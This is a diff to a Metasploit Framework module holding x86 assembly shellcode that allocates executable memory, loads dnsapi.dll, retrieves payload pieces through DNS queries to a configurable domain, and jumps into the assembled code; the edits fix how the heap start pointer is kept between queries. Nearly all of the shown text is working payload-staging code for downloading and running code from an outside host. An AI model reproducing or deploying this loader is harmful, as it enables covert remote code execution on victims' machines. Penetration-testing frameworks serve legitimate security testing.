@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -180,7 +176,9 @@ alloc_space:
 	push 0x0		; lpAddress
 	push 0xE553A458        	; kernel32.dll!VirtualAlloc
 	call ebp 
-	push eax		; save pointer
+	push eax		; save pointer on stack, will be used in memcpy
+	mov #{bufferreg}, eax	; save pointer, to jump to at the end
+
 
 ;load dnsapi.dll
 load_dnsapi:
@@ -225,6 +223,7 @@ get_dnsname:
 	db "a.#{dnsname}", 0x00
 
 get_query_result:
+	xchg #{bufferreg},edx	; save start of heap
 	pop #{bufferreg}	; heap structure containing DNS results
 	mov eax,[#{bufferreg}]	; if first dword has a non-null value, then stop
 	test eax,eax
@@ -243,11 +242,11 @@ copy_piece_to_heap:
 	push edi		; 2 more times to make sure it's at esp+8
 	push edi		; 
 	inc ebx			; increment sequence
+	xchg #{bufferreg},edx	; restore start of heap
 	jmp dnsquery		; try to get the next piece, if any
 
 jump_to_payload:
-	mov #{bufferreg},[esp+0x2c]	; retrieve original begin of RWX heap
-	jmp #{bufferreg}	; and jump to it
+	jmp #{bufferreg}	; jump to it
 
 
 
